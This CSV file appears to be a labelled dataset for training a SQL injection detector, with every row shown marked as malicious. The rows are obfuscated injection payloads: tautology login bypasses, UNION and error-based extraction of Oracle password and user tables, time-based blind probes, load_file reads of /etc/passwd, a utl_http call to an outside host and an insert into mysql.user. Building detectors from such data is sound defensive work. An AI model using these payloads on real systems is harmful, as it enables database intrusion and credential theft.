Query,Label
" %%a%%n%%d 1  =  utl_inaddr.get_host_address   (    (   %%sel%ec%t D%isTinCT  (  PASSWorD  )   f%%r%%o%m   (  %%sel%ec%t D%isTinCT  (  PASSWorD  )  , ROWNUM AS lim%%i%t f%%r%%o%m SYS.USER$  )   %%w%he%r%%e lim%%i%t  =  8   )    )    %%a%%n%%d 'i'  =  'i",1
" %s%%el%ec%%t * %%f%%r%o%m users %%whe%re id  =  1 o%%r ""?#"" o%%r 1  =  1 -- 1",1
"%o%%r 1  =  1 %o%%r """"  =  ",1
/**/%%o%%r/**/1/**/  =  /**/1,1
" %s%e%l%%e%%ct * %f%r%om users %w%%h%%e%r%%e id  =  1 o%r "".  (  "" o%r 1  =  1 -- 1",1
" s%%e%l%e%%ct * fr%o%%m users %%w%he%%re id  =  '1' union s%%e%l%e%%ct ||/1,version  (    )   -- 1'",1
" %s%e%%l%%ec%%t * %%f%ro%%m users whe%re id  =  '1' union %s%e%%l%%ec%%t +\.,@@VERSION -- 1'",1
or 1  =  1/*,1
%27 %o%r 1  =  1,1
" s%%elec%t * %fro%m users %%wh%e%%re id  =  1 <@&@ union s%%elec%t 1,version  (    )   -- 1",1
" sel%ec%t * %fr%%o%m users w%h%e%r%e id  =  '1' union sel%ec%t $*$,@@VERSION -- 1'",1
"1;  (  load_file  (  char  (  47,101,116,99,47,112,97,115, ...",1
" se%%l%ect * %f%ro%m users %%wher%%e id  =  '1' or $ 1  =  1 union se%%l%ect 1,@@VERSION -- 1'",1
%%s%e%l%e%c%%t * %fr%%o%m users w%%her%e id  =  1 %%or \.<1 %%or 1  =  1 -- 1,1
" %s%e%%le%%ct * %%f%ro%m users %%w%%her%e id  =  '1' %%o%%r \<\ union %s%e%%le%%ct 1,@@VERSION -- 1'",1
" %%s%%e%%lec%%t * %f%ro%%m users %w%%h%e%%r%e id  =  1 union %%s%%e%%lec%%t 1||1,version  (    )   -- 1",1
" s%%ele%c%%t * %f%r%%o%%m users %%w%%h%%er%%e id  =  1 ||1 union s%%ele%c%%t n%%ull,banner %f%r%%o%%m v$version %%w%%h%%er%%e rownum  =  1 -- 1",1
%s%e%l%ec%%t * f%%r%o%m users %%w%%h%er%e id  =  '1' %o%r \.<\ %o%r 1  =  1 -- 1',1
" %s%%e%%l%ec%%t * %%f%%r%o%m users %%wh%%e%r%e id  =  1 %%o%r ""]{"" %%o%r 1  =  1 -- 1",1
" %s%%e%le%c%t * f%r%%o%m users %wh%e%%r%e id  =  1 o%%r "".@"" o%%r 1  =  1 -- 1",1
" %s%e%l%%ec%%t * fr%o%%m users w%h%%e%r%e id  =  1 %%o%r ""$["" %%o%r 1  =  1 -- 1",1
%o%%r 1 --',1
" %s%%el%%e%%c%t * fr%%o%m users w%%h%e%r%e id  =  1 or "",;"" or 1  =  1 -- 1",1
"admin"" %%o%%r 1  =  1#",1
" %se%lec%%t * %%f%ro%%m users wh%er%%e id  =  1 +  (  1  )   union %se%lec%%t %n%%ul%%l,banner %%f%ro%%m v$version wh%er%%e rownum  =  1 -- 1",1
\x27UNION %%s%el%%e%c%%t,1
PR%inT,1
" s%%ele%c%%t * %%f%%rom users %%w%he%%r%e id  =  '1' union s%%ele%c%%t   (  \.  )  ,@@VERSION -- 1'",1
%o%r 1  =  1--,1
1 %%o%r pg_sleep  (  __TIME__  )  --,1
" %s%e%l%e%c%%t * fr%%o%%m users w%h%%e%r%%e id  =  1 or "",#"" or 1  =  1 -- 1",1
admi%%n'  )   or   (  '1'  =  '1'/*,1
%%or 2 %b%%et%w%e%en 1 %and 3,1
" %%se%l%%e%c%t * %from users %%w%%h%e%r%e id  =  1 %%o%r ""  )  .""  =  1 %%o%r 1  =  1 -- 1",1
" %%s%%el%ec%%t * %f%%r%%om users w%her%%e id  =  1 o%%r 1#"". union %%s%%el%ec%%t %%n%%u%l%l,version  (    )   -- 1",1
admi%%n' o%r '1'  =  '1,1
; if %n%%o%%t  (  %s%e%%l%%e%%c%t system_user  )   <> 'sa' waitf%o%r delay '0:0:2' --,1
" %%sele%c%t * %f%r%%o%%m users w%he%re id  =  1 union %%sele%c%t 1,banner %f%r%%o%%m v$version w%he%re rownum  =  1 -- 1",1
""" o%r 0  =  0 --",1
" %s%e%%l%ec%t * %f%r%om users %w%%h%%e%%r%%e id  =  1 union %s%e%%l%ec%t @ $_,version  (    )   -- 1",1
%%s%%e%le%%ct * %%f%r%o%%m users w%he%r%%e id  =  1 <@.$ o%%r 1  =  1 -- 1,1
" sel%ect * f%%r%%o%m users where id  =  1 o%%r ""%."" o%%r 1  =  1 -- 1",1
" %%se%l%%e%c%t * %f%%r%om users wh%e%r%e id  =  1 + $+*$ union %%se%l%%e%c%t n%u%%l%l,@@VERSION -- 1",1
" s%ele%%ct * %%f%r%%om users %%w%%he%r%%e id  =  1 %%o%r "",."" %%o%r 1  =  1 -- 1",1
char%4039%41%2b%40%se%%l%%e%%ct,1
" se%%l%e%%ct * %%f%%r%o%%m users %w%her%%e id  =  1 %o%r ""1&"" %o%r 1  =  1 -- 1",1
adm%%in'  )   %o%r   (  '1'  =  '1,1
declare @s varchar   (  200  )   %%s%%e%%l%e%ct @s   =   0x73656c6 ...,1
"o%%r 0  =  0 #""",1
" %%s%%e%%l%%ect * %%fro%m users %w%%h%%ere id  =  1 %%or "".]"" %%or 1  =  1 -- 1",1
  )   o%%r   (  'x'  =  'x,1
" %%se%%l%e%c%t * f%%r%%om users %wh%%e%re id  =  1.<@$ union %%se%%l%e%c%t 1,version  (    )   -- 1",1
$  (  sleep 50  ) ,1
" %%s%%el%%ec%t * fro%m users %%wh%%ere id  =  1 *1 union %%s%%el%%ec%t %n%%u%ll,banner fro%m v$version %%wh%%ere rownum  =  1 -- 1",1
"1 union all %s%e%lect 1,2,3,4,5,6,name f%%r%o%m sysobjects w%h%e%re xtype   =   'u' --",1
" %s%e%%l%%ec%t * fr%om users w%%h%%e%r%e id  =  1 %%or 1#"". union %s%e%%l%%ec%t 'a',version  (    )   -- 1",1
" %s%e%%l%ect * %%fro%m users %w%he%r%e id  =  1 %o%r 1#""; union %s%e%%l%ect n%%ul%l,version  (    )   -- 1",1
" s%%e%l%ect * f%%ro%m users %%wh%%e%re id  =  1 %o%r 1#""? %o%r 1  =  1 -- 1",1
"""a"""" %%o%%r 1  =  1--""",1
" se%le%%c%%t * %f%%r%%om users wh%%er%e id  =  1 *1 union se%le%%c%%t 1,banner %f%%r%%om v$version wh%%er%e rownum  =  1 -- 1",1
" a%n%%d 1  =  utl_i%%naddr.get_host_address   (    (   %%sele%c%t D%%i%%sTi%%nCT  (  column_name  )   %f%rom   (  %%sele%c%t D%%i%%sTi%%nCT  (  column_name  )  , ROWNUM AS l%i%%m%%i%t %f%rom all_tab_columns  )   whe%%r%e l%i%%m%%i%t  =  4   )    )    a%n%%d 'i'  =  'i",1
" %%s%e%%l%e%%c%t * f%%r%%o%m users %%w%h%e%r%e id  =  '1' union %%s%e%%l%e%%c%t   (  \  )  ,@@VERSION -- 1'",1
1 an%%d user_name  (    )     =   'dbo',1
"; if %%n%ot  (  substr%%i%%ng   (    (   %se%%l%ec%t @@version  )  ,24,1  )   <> 1  )   waitf%or delay '0:0:2' --",1
" %s%%e%%le%ct * %%fr%o%m users %%wh%%er%%e id  =  1 %o%%r 1#""$ union %s%%e%%le%ct 1,version  (    )   -- 1",1
" selec%%t * %%f%r%o%%m users w%her%%e id  =  1 %or 1#""{ union selec%%t %%n%%u%%l%l,version  (    )   -- 1",1
s%%el%e%c%%t * fro%m users %wh%%e%%re id  =  '1' *$ . %o%r 1  =  1 -- 1',1
%%se%l%ec%t * f%r%om users w%he%%r%%e id  =  1 +$+. %%o%%r 1  =  1 -- 1,1
%se%l%e%%ct * %f%r%%om users %%whe%r%e id  =  1 %%o%%r   (  \+  )    =  1 %%o%%r 1  =  1 -- 1,1
" %%a%%nd 1  =  utl_inaddr.get_host_address   (    (   %%s%e%%l%%e%c%t Di%sTinCT  (  USERNAME  )   %%f%ro%%m   (  %%s%e%%l%%e%c%t Di%sTinCT  (  USERNAME  )  , ROWNUM AS %%l%%i%mit %%f%ro%%m SYS.ALL_USERS  )   %%w%her%e %%l%%i%mit  =  6   )    )    %%a%%nd 'i'  =  'i",1
%%or 1  =  1 %%or ''  =  ',1
%%se%l%%ect * f%r%%o%m users %%wh%%e%r%%e id  =  1   %o%r 1  =  1 -- 1,1
%%or 'text' > 't',1
"1234 "" an%%d 1  =  0 UNION ALL s%e%%l%ec%%t ""adm%%in"", ""81dc9bdb52d04dc20036dbd8313ed055",1
" %%s%e%l%e%%ct * %%f%ro%m users %%w%%h%%ere id  =  1 %o%%r ""%["" %o%%r 1  =  1 -- 1",1
" s%e%le%%c%%t * f%%r%om users %%w%%h%er%%e id  =  1 %or 1#"";  =  1 union s%e%le%%c%%t 1,version  (    )   -- 1",1
adm%i%n' %or '1'  =  '1'#,1
s%el%%ec%t * %%fr%o%m users w%he%re id  =  1 +$ 1 %or 1  =  1 -- 1,1
s,1
" %a%%n%%d 1  =  utl_%i%naddr.get_host_address   (    (   %%s%el%ec%t DisT%i%nCT  (  USERNAME  )   fr%%o%%m   (  %%s%el%ec%t DisT%i%nCT  (  USERNAME  )  , ROWNUM AS %li%%m%%i%%t fr%%o%%m SYS.ALL_USERS  )   %%w%%her%%e %li%%m%%i%%t  =  4   )    )    %a%%n%%d 'i'  =  'i",1
 s%%e%l%%e%c%%t * f%rom %%i%nfo%%rmation_schema.t%%ab%%l%es--,1
" %%se%%l%e%c%t * from users w%%her%e id  =  1 %%or ""$&"" %%or 1  =  1 -- 1",1
1   )    )    or pg_sleep  (  __TIME__  )  --,1
" se%l%%ec%t * fr%om users wh%e%%re id  =  '1' union se%l%%ec%t !<@,version  (    )   -- 1'",1
declare @q nvarchar   (  200  )   %%se%%le%%c%t @q   =   0x770061 ...,1
 %%or 1  =  1 %%or ''  =  ',1
%%s%%e%%lec%%t * f%%ro%%m users %%w%her%e id  =  1 %!<1 %%o%%r 1  =  1 -- 1,1
declare @q nvarchar   (  200  )   s%%e%%l%ec%%t @q   =   0x770061006900740066006F0072002000640065006C00610079002000270030003A0030003A0031003000270000 exec  (  @q  ) ,1
" %se%l%ect * f%%r%%o%m users %%w%%h%%er%%e id  =  1 %%o%r ""]1"" %%o%r 1  =  1 -- 1",1
" %%s%%el%ec%%t * %fr%om users %%wh%%er%%e id  =  1 %%or $+<1 union %%s%%el%ec%%t 1,@@VERSION -- 1",1
o%r 'unusual'   =   'unusual',1
 o%r 1 in   (  %%se%%le%%c%t @@version  )  --,1
t%%r%%un%c%%a%t%e,1
as,1
 o%r 3  =  3 --,1
" %s%el%e%%c%%t * %%f%ro%m users %w%%h%ere id  =  1 ||1 union %s%el%e%%c%%t 1,banner %%f%ro%m v$version %w%%h%ere rownum  =  1 -- 1",1
" %%se%%l%%ec%t * f%ro%%m users %w%h%e%%re id  =  1 <@$$ union %%se%%l%%ec%t 1,version  (    )   -- 1",1
"admin""  )   %o%r   (  ""1""  =  ""1",1
" s%%e%l%e%%ct * %fr%o%m users %wh%e%r%e id  =  1 o%r 1#""@ union s%%e%l%e%%ct 'a',version  (    )   -- 1",1
"1  )   %or benchmark  (  10000000,MD5  (  1   )    )   #",1
" %%s%%e%%l%ec%t * %%f%%rom users w%%h%e%r%%e id  =  1 union %%s%%e%%l%ec%t .1_,version  (    )   -- 1",1
 %a%n%d 1  =  utl_%i%naddr.get_host_address   (    (   %se%%l%e%%ct SYS.%d%a%ta%%ba%%se_NAME fr%%o%m DUAL   )    )    %a%n%d 'i'  =  'i,1
" o%%r 0  =  0 #""",1
%%s%%e%l%%ect * %%f%%r%%o%m users %%w%her%%e id  =  1 %$ 1 o%r 1  =  1 -- 1,1
%s%%e%l%e%%ct * f%ro%%m users %%whe%r%e id  =  1 %!<@ o%r 1  =  1 -- 1,1
"; if not  (  substr%i%ng   (    (   %%s%e%%l%e%c%t @@version  )  ,25,1  )   <> 0  )   waitf%or delay '0:0:2' --",1
1  )   or sleep  (  __TIME__  )  #,1
" %s%el%%e%%c%%t * %f%%r%%om users w%%h%%ere id  =  1 %o%r ""1_"" %o%r 1  =  1 -- 1",1
" %%s%%el%e%%c%%t * f%r%om users w%%h%e%re id  =  1 <1## union %%s%%el%e%%c%%t 1,version  (    )   -- 1",1
" se%%l%e%%c%%t * %fr%om users %%w%h%%er%e id  =  1 + $+*\ union se%%l%e%%c%%t nu%%l%%l,@@VERSION -- 1",1
%s%el%ec%t * f%r%%om users w%%h%e%r%%e id  =  1. <@ %or 1  =  1 -- 1,1
 %%o%r true--,1
; execute immediate 'sel' || 'ect us' || 'er',1
hi' %or 'x'  =  'x';,1
s%%e%l%e%%c%%t * %%fr%%o%m users %wher%e id  =  1 <@ %or 1  =  1 -- 1,1
" %%se%l%%e%%ct * %fro%m users %%w%h%%e%%r%e id  =  1 %o%r "".,"" %o%r 1  =  1 -- 1",1
adm%%i%%n' #,1
" %%se%%l%ec%t * %%f%r%%om users %whe%r%e id  =  1 <@$_ union %%se%%l%ec%t 1,version  (    )   -- 1",1
" %%se%l%ec%t * %%f%r%o%m users %%wh%e%r%e id  =  1 %%o%%r "",  (  "" %%o%%r 1  =  1 -- 1",1
" %se%l%%ec%%t * %f%%r%om users %%whe%%r%e id  =  1 o%%r "",{"" o%%r 1  =  1 -- 1",1
" union %%s%el%e%%c%%t 1,load_file  (  '/etc/passwd'  )  ,1,1,1;",1
"""  )  ;waitf%o%r delay '0:0:__TIME__'--",1
 %o%r 'unusual'   =   'unusual',1
"%in%%s%%e%r%t %i%%nto mysql.user   (  user, host, passwo%rd  )   v%%a%l%u%%es   (  'name', 'localhost', passwo%rd  (  'pass123'   )    )   ",1
"adm%%i%%n"" %o%%r ""1""  =  ""1""/*",1
" %selec%t * f%r%om users wh%%e%re id  =  1 or ""1  (  ""  =  1 or 1  =  1 -- 1",1
" %s%e%%le%%c%%t * f%%r%%o%m users %w%%h%%e%%re id  =  1 %%or \<1 union %s%e%%le%%c%%t 1,@@VERSION -- 1",1
%l%ik%%e,1
%o%r username %%li%%k%%e char  (  37  )  ;,1
 )    )    %%or pg_sleep  (  __TIME__  )  --,1
s%%e%l%ect * %%f%%r%%o%m users w%h%%e%%r%%e id  =  1 or $+<\ or 1  =  1 -- 1,1
%%o%%r 3  =  3,1
" %s%e%%l%%ect * %f%%r%o%m users w%h%e%re id  =  1 %%o%%r ""  (  ."" %%o%%r 1  =  1 -- 1",1
%%s%%ele%c%%t * %%f%r%o%m users %%wh%%e%re id  =  1 %o%r   (  $+  )    =  1 %o%r 1  =  1 -- 1,1
exec sp,1
" sel%%ec%%t * %fr%o%%m users %%where id  =  1 or \+<$ union sel%%ec%%t 1,@@VERSION -- 1",1
s%el%ec%%t * %%fr%%om users wh%%e%%re id  =  1 %o%r \<$ %o%r 1  =  1 -- 1,1
" %s%%e%l%%ec%%t * fr%%om users %w%%here id  =  1.&&1 union %s%%e%l%%ec%%t 1,version  (    )   -- 1",1
admin' %o%r 1  =  1/*,1
a' waitf%or delay '0:0:10'--,1
" %se%%le%c%%t * %%fr%o%%m users wh%e%%re id  =  1 +  (  \  )   union %se%%le%c%%t %%n%u%%ll,@@VERSION -- 1",1
" s%e%l%%e%%c%%t * %f%r%o%m users %%wh%er%e id  =  1 union s%e%l%%e%%c%%t .1$_,version  (    )   -- 1",1
%%a%nd 1 %%i%%n   (  %%se%%l%ec%t var %fr%o%%m temp  )  --,1
hi'  )   %%o%r   (  'a'  =  'a,1
" and 1  =  utl_inaddr.get_host_address   (    (   %s%%e%%l%%ec%%t D%i%%sTinCT  (  column_name  )   %f%r%om   (  %s%%e%%l%%ec%%t D%i%%sTinCT  (  column_name  )  , ROWNUM AS l%%i%mit %f%r%om all_tab_columns  )   w%%h%e%r%%e l%%i%mit  =  1   )    )    and 'i'  =  'i",1
"adm%i%n"" %%or 1  =  1",1
"""  )   %%or true--",1
" %%sel%e%ct * %%fr%%o%m users w%%he%r%%e id  =  '1' %o%r $ .  =  1 union %%sel%e%ct 1,@@VERSION -- 1'",1
" s%e%%lec%t * from users %wh%%e%re id  =  1 %%o%%r ""  (  {"" %%o%%r 1  =  1 -- 1",1
1  )   %o%r pg_sleep  (  __TIME__  )  --,1
" %%sel%ec%t * %fr%o%m users %w%h%e%r%e id  =  1 %%or ""{."" %%or 1  =  1 -- 1",1
"""  )   %%o%%r sleep  (  __TIME__  )    =  """,1
%%se%l%%e%%c%%t * %f%r%o%m users %w%h%e%re id  =  1.<@. %or 1  =  1 -- 1,1
"adm%%i%n""  )   %%or   (  ""1""  =  ""1""--",1
" %s%%e%%l%ect * %fr%%o%m users %%whe%r%e id  =  1<@.. union %s%%e%%l%ect 1,version  (    )   -- 1",1
; exec xp_regread,1
" se%l%ect * f%%rom users %w%%he%%r%e id  =  '1' + @ 1 union se%l%ect 1,version  (    )   -- 1'",1
%%s%el%e%ct * %%f%%r%o%m users %w%%h%er%%e id  =  1 + \+%1 o%r 1  =  1 -- 1,1
" s%%e%%l%e%ct * %%f%ro%m users %wh%e%r%%e id  =  1 %%or "";1"" %%or 1  =  1 -- 1",1
" %%se%l%e%%c%%t * %%f%%r%om users %%w%h%%e%%r%e id  =  1 o%r ""%&"" o%r 1  =  1 -- 1",1
1 %%an%d 1  =  1,1
or 0  =  0 #,1
union %%se%l%%e%c%%t * f%r%om users w%h%%e%%r%e log%%i%%n   =   char ...,1
" %%s%%e%l%%e%%ct * %%f%r%om users %%whe%re id  =  1 union %%s%%e%l%%e%%ct 1||@,version  (    )   -- 1",1
adm%%i%%n'  )   o%r '1'  =  '1'--,1
1;%s%e%%l%e%c%t *,1
" %s%%e%%lect * %%f%r%om users %whe%r%%e id  =  1 %o%r ""{;"" %o%r 1  =  1 -- 1",1
x' an%d 1  =    (  s%%e%%le%c%t count  (  *  )   %from tabname  )  ; --,1
" %se%%l%ec%%t * %%f%r%%o%m users %%wh%%e%re id  =  '1' %%or """"<@ union %se%%l%ec%%t 1,version  (    )   -- 1'",1
" %s%%e%l%%e%%ct * %%f%ro%m users w%h%%e%%re id  =  1 %%or ""?,"" %%or 1  =  1 -- 1",1
" %s%e%%l%e%%ct * %f%%r%o%%m users %w%%h%er%e id  =  '1' ||1 union %s%e%%l%e%%ct 1,banner %f%%r%o%%m v$version %w%%h%er%e rownum  =  1 -- 1'",1
"1 %%or benchmark  (  10000000,MD5  (  1   )    )   #",1
procedure,1
o%r ''  =  ',1
 a%nd 1  =  utl_i%naddr.get_host_address   (    (   %s%%e%%l%e%ct SYS.LOGi%n_USER f%%r%%om DUAL   )    )    a%nd 'i'  =  'i,1
" a%%n%%d 1  =  utl_inaddr.get_host_address   (    (   %%s%%el%ec%t Di%%sTinCT  (  USERNAME  )   %f%r%%om   (  %%s%%el%ec%t Di%%sTinCT  (  USERNAME  )  , ROWNUM AS %%l%i%m%%it %f%r%%om SYS.ALL_USERS  )   %w%%h%er%e %%l%i%m%%it  =  2   )    )    a%%n%%d 'i'  =  'i",1
\'; %%d%es%c users; --,1
" se%%l%%e%%ct * f%%r%%o%m users %w%h%e%%r%%e id  =  1 %%o%%r   (  \.  )    =  1 union se%%l%%e%%ct 1,@@VERSION -- 1",1
s%e%%l%%e%%c%t * f%ro%%m users %%w%here id  =  '1' %%or $ 1  =  1 %%or 1  =  1 -- 1',1
""" or """"^""",1
"""-""",1
" %s%%elec%t * %f%r%%o%m users %%w%%her%e id  =  1 %%or \<   =  1 union %s%%elec%t 1,@@VERSION -- 1",1
" %%s%%e%%le%%c%%t * %%fro%m users wher%e id  =  1 union %%s%%e%%le%%c%%t 1<@$,version  (    )   -- 1",1
" %%s%e%%l%%e%c%%t * %f%%r%o%m users %%whe%re id  =  1 *\ union %%s%e%%l%%e%c%%t %n%u%%l%%l,@@VERSION -- 1",1
" %s%e%l%e%%ct * f%r%%om users %w%%he%%re id  =  '1' o%r !<@ union %s%e%l%e%%ct 1,version  (    )   -- 1'",1
" %%se%%l%e%c%t * %%f%rom users %%w%h%%ere id  =  1 %o%%r "".%"" %o%%r 1  =  1 -- 1",1
adm%%i%n'/*,1
" %%s%e%l%e%c%%t * %fr%%om users %%wher%e id  =  1 o%%r ""  (  #"" o%%r 1  =  1 -- 1",1
||UTL_HTTP.REQUEST,1
" and 1  =  utl_inaddr.get_host_address   (    (   %sel%%e%c%%t D%isTinCT  (  t%%a%%b%%l%e_name  )   %%f%r%om   (  %sel%%e%c%%t D%isTinCT  (  t%%a%%b%%l%e_name  )  , ROWNUM AS li%%m%%i%%t %%f%r%om sys.all_t%%a%%b%%l%es  )   %w%%h%e%%r%e li%%m%%i%%t  =  1   )    )    and 'i'  =  'i",1
" %%s%e%l%ect * %%f%%ro%%m users wh%e%r%%e id  =  '1'<@.. union %%s%e%l%ect 1,version  (    )   -- 1'",1
"""   )    )    o%%r benchmark  (  10000000,MD5  (  1   )    )   #",1
" se%le%%c%%t * %f%rom users %%w%%he%%r%%e id  =  1 <@.$ union se%le%%c%%t 1,version  (    )   -- 1",1
" %s%e%%le%%c%t * %f%r%%o%m users whe%%r%%e id  =  1 %o%%r $ .  =  1 union %s%e%%le%%c%t 1,@@VERSION -- 1",1
%s%%el%e%%ct * %fro%%m users wh%%e%re id  =  '1' <@.$ %o%r 1  =  1 -- 1',1
1 uni/**/on s%%e%l%%e%%c%%t all %%f%r%%o%%m wh%%e%r%e,1
" %s%e%%l%e%c%t * from users w%%h%%er%e id  =  1 +$ . union %s%e%%l%e%c%t %n%u%%ll,@@VERSION -- 1",1
" %%s%e%%lec%t * %%f%r%%om users %%wh%er%e id  =  1 %%or 1#""? union %%s%e%%lec%t %n%%u%ll,version  (    )   -- 1",1
adm%%i%%n'  )   %%o%%r '1'  =  '1'#,1
||utl_http.request  (  'httP://192.168.1.1/'  )  ||',1
%%or '7659'  =  '7659,1
" %%se%%l%%ect * f%%rom users %%whe%%re id  =  1 o%r ""{@"" o%r 1  =  1 -- 1",1
" %%sele%ct * f%%r%o%m users %%whe%%re id  =  1 union %%sele%ct +!<1,version  (    )   -- 1",1
" %%and 1  =  utl_i%naddr.get_host_address   (    (   %selec%%t D%i%sTi%nCT  (  granted_role  )   %f%%rom   (  %selec%%t D%i%sTi%nCT  (  granted_role  )  , ROWNUM AS l%i%mi%t %f%%rom dba_role_privs %w%%h%%e%%r%%e GRANTEE  =  SYS.LOGi%nUSER  )   %w%%h%%e%%r%%e l%i%mi%t  =  6   )    )    %%and 'i'  =  'i",1
" se%%l%%e%%ct * %%fr%om users %w%he%r%%e id  =  1 or ""  (  @"" or 1  =  1 -- 1",1
%%or true--,1
" %%s%e%%l%%e%ct * f%%r%o%%m users %%w%h%e%%re id  =  1 union %%s%e%%l%%e%ct !<1,version  (    )   -- 1",1
" %%s%e%le%%c%t * %f%%ro%%m users %%whe%re id  =  '1' union %%s%e%le%%c%t \#,@@VERSION -- 1'",1
" %%s%e%le%%c%%t * %fr%om users %w%h%%e%%r%%e id  =  1 %%o%%r 1#""{ union %%s%e%le%%c%%t 1,version  (    )   -- 1",1
""" %o%r true--",1
s%e%l%%e%c%%t * fr%o%%m users %w%h%er%%e id  =  1. o%r 1  =  1 -- 1,1
" %s%%e%l%e%%c%%t * f%%ro%%m users %w%h%%er%e id  =  1 %%o%r @#"",  =  1 union %s%%e%l%e%%c%%t 1,version  (    )   -- 1",1
" %s%%e%l%%ec%%t * f%%r%%o%%m users w%%h%e%r%%e id  =  1 %%o%r "";@"" %%o%r 1  =  1 -- 1",1
â o%r 3  =  3 --,1
 %a%%nd 1  =  utl_%%inaddr.get_host_address   (    (   %s%e%%le%%c%%t global_name %f%r%om global_name   )    )    %a%%nd 'i'  =  'i,1
" %%se%%l%%e%c%t * fro%m users wh%%er%e id  =  1 +1 union %%se%%l%%e%c%t %n%%u%%ll,banner fro%m v$version wh%%er%e rownum  =  1 -- 1",1
" s%%e%%lect * %f%%ro%m users w%he%re id  =  1 %or "",,""  =  1 %or 1  =  1 -- 1",1
" %%s%%elect * fr%om users %%w%%h%er%%e id  =  1 + $+%1 union %%s%%elect %n%%u%%ll,@@VERSION -- 1",1
